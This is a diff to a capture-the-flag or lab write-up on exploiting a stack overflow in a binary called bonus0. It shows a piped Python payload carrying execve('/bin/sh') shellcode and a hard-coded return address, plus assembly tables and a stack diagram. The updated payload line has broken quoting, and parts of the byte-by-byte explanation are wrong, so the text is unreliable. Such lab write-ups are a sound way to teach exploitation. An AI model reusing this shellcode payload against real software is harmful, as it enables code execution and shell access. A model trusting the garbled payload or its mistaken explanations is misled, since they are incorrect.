@@ -122,15 +122,86 @@ buffer  |      buffer[64]      |
         Lower addresses
 
 ```
-If writes starting at buffer + 22 continue past the end of the buffer, they move toward higher addresses in memory. 
-The first control data they would encounter is the saved EBP, and immediately after that comes the saved return address.
+## now how to conbine it with our exercise
 
-## payload for test 
+we will here write a payload into the read function that will be the null terminator in a index more than 20 to make sure there is no null terminator in the first and 
+second buffers, and after it the program will copy the first into the main buffer but it will make a copies also to the second buffer than because there is `\0` in the first to make the strcpy function stop
+until find a `\0`.
+
+exmaple to explain it:
 ```bash
-(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89"+"a"*4075+"\n"+"\xe1\xb0\x0b\xcd\x80BBBB"+"\x06\xf7\xff\xbf"+"a"*10)'; cat) | /home/user/bonus0/bonus0
+So, conceptually, strcpy() sees:
+
+first
+   ↓
+
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB??????????????\0 
+
+second
+   ↓
+BBBBBBBBBBBBBBBBBBB??????????????\0
+```
+
+after it we will make the main buffer full of A and B and after it we will reach the epb and return address.
+
+## payload
+
+```bash
+(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89"+"a"*4075+"\n"+""\xe1\xb0\x0b\xcd\x80BBBB+"\x06\xf7\xff\xbf"+"a"*10)'; cat) | /home/user/bonus0/bonus0
 ```     
 
-after it the program will run the system("/bin/sh") and we can get the shell.
+explanition of the payload:
+- `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89` this mean  
 
-what you should do after it :
+```assembly
+Bytes	        Assembly	Purpose
+31 c0	        xor eax, eax	Clears EAX (sets it to 0).
+50	        push eax	Pushes a 0 onto the stack.
+68 2f2f7368	push "//sh"	Pushes the ASCII bytes for "//sh" onto the stack.
+68 2f62696e	push "/bin"	Pushes the ASCII bytes for "/bin" onto the stack.
+89 e3	        mov ebx, esp	Makes EBX point to the beginning of the string on the stack.
+50	        push eax	Pushes another 0.
+89 e2	        mov edx, esp	Makes EDX point to that 0 value.
+53	        push ebx	Pushes the pointer stored in EBX.
+89	        Incomplete instruction	Missing the next byte.
+```
 
+- `"a"*4075` : this fills the local read buffer in the function `p()`.
+- `\xe1\xb0\x0b\xcd\x80` : this is the machine code for the `execve` system call to execute the shellcode.
+
+```assembly
+Bytes	Assembly	Meaning
+b0 0b	mov al, 0xb	syscall number = execve
+cd 80	int 0x80	call kernel
+```
+
+- `BBBB` : filler to overwrite stack / align memory.
+- `\x06\xf7\xff\xbf` : this is the address of the main buffer where our shellcode resides, which will be used to
+
+here the final visualization of the stack after the overflow:
+
+```bash
+        Higher addresses
+        +------------------------------------------------+
+Return  |  0xbffff706  ← buffer address                  |
+        |                                                |
+        +------------------------------------------------+
+Saved   |  0x42424242  ← overwritten saved EBP ("BBBB")  |
+EBP     |                                                |
+        +------------------------------------------------+
+        |                                                |
+buffer  |  int 0x80  ← syscall   ===> execve             |
+        |                                                |
+        |  SHELLCODE:                                    |
+        |  \x31\xc0\x50\x68\x2f\x2f\x73\x68              |
+        |  \x68\x2f\x62\x69\x6e                          |
+        |  \x89\xe3\x50\x89\xe2\x53\x89                  |
+        |  \xb0\x0b\xcd\x80                              |
+        |                                                |
+        +--------------------+---------------------------+ adreess of the main buffer 0xbffff706
+                             ^
+                             |
+                 buffer start (p() 4096 bytes region)
+                             |
+                             +→ input injected via read()   
+```
